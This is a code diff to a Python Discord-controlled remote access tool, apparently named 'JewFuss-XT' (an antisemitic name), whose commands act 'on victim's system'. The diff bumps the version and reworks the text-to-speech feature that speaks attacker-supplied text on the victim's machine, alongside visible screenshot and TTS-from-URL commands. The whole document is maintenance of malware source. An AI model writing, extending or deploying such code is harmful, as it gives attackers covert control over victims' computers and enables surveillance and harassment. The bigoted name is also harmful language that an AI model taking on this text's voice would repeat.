@@ -43,7 +43,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.7" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.8" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -1374,49 +1374,74 @@ async def ss(ctx, display_index: int = 0):
         await ctx.send(f"Error executing screenshot command: {str(e)}")
                 
 _tts_thread = None
+_tts_error = None
 _tts_stop = None
+_MAX_CHUNK = 4096
 
-def tts_worker(chunks, stop_evt: Event):
+def tts_worker(text, stop_evt: Event):
+    global _tts_error
     pythoncom.CoInitialize()
     try:
         v = win32com.client.Dispatch("SAPI.SpVoice")
-        for c in chunks:
-            if stop_evt.is_set():
-                break
-            v.Speak(c, 1)
-            while True:
-                if stop_evt.is_set():
-                    try: v.Speak("", 2)
-                    except Exception: pass
-                    break
-                if v.WaitUntilDone(150):
-                    break
+        cur = ""
+        for t in re.split(r"([\.!?]\s+|\n+)", text):
+            if not t:
+                continue
+            if len(cur) + len(t) > _MAX_CHUNK and cur:
+                s = cur.strip()
+                i = 0
+                while i < len(s):
+                    seg = s[i:i+_MAX_CHUNK].strip()
+                    if seg:
+                        if stop_evt.is_set(): break
+                        v.Speak(seg, 1)
+                        while True:
+                            if stop_evt.is_set():
+                                try: v.Speak("", 2)
+                                except Exception: pass
+                                break
+                            if v.WaitUntilDone(150): break
+                    i += _MAX_CHUNK
+                if stop_evt.is_set(): break
+                cur = t
+            else:
+                cur += t
+
+        if not stop_evt.is_set():
+            s = cur.strip()
+            i = 0
+            while i < len(s):
+                seg = s[i:i+_MAX_CHUNK].strip()
+                if seg:
+                    if stop_evt.is_set(): break
+                    v.Speak(seg, 1)
+                    while True:
+                        if stop_evt.is_set():
+                            try: v.Speak("", 2)
+                            except Exception: pass
+                            break
+                        if v.WaitUntilDone(150): break
+                i += _MAX_CHUNK
+
         try: v.Speak("", 2)
         except Exception: pass
+    except Exception as e:
+        _tts_error = e
     finally:
         pythoncom.CoUninitialize()
 
 def start_tts(text):
-    global _tts_thread, _tts_stop
+    global _tts_thread, _tts_stop, _tts_error
+    _tts_error = None
     if _tts_thread and _tts_thread.is_alive():
         if _tts_stop: _tts_stop.set()
     text = re.sub(r"\s+", " ", text or "").strip()
     if not text: return False
-    if len(text) > 50000: text = text[:50000] + " …"
-    chunks = []
-    cur = ""
-    for t in re.split(r"([\.!?]\s+|\n+)", text):
-        if not t: continue
-        if len(cur) + len(t) > 1000 and cur:
-            chunks.append(cur.strip()); cur = t
-        else:
-            cur += t
-    if cur.strip(): chunks.append(cur.strip())
-    if not chunks: return False
     _stop = Event()
     _tts_stop = _stop
-    _tts_thread = Thread(target=tts_worker, args=(chunks, _stop), daemon=True)
+    _tts_thread = Thread(target=tts_worker, args=(text, _stop), daemon=True)
     _tts_thread.start()
+    if _tts_error: raise _tts_error
     return True
 
 @bot.command(name="tts", help="Run TTS on victim's system")
@@ -1424,8 +1449,11 @@ async def tts(ctx, *, text: str = None):
     if not text or not text.strip():
         await ctx.send("You must provide text for TTS")
         return
-    ok = start_tts(text)
-    await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "You must provide text for TTS.")
+    try:
+        ok = start_tts(text)
+        await ctx.send(f"TTS started. Use {bot.command_prefix}stoptts to stop it." if ok else "You must provide text for TTS.")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
 
 @bot.command(name="ttsurl", help="Run TTS on victim's system from a URL (should be raw text)")
 async def ttsurl(ctx, url: str = None):
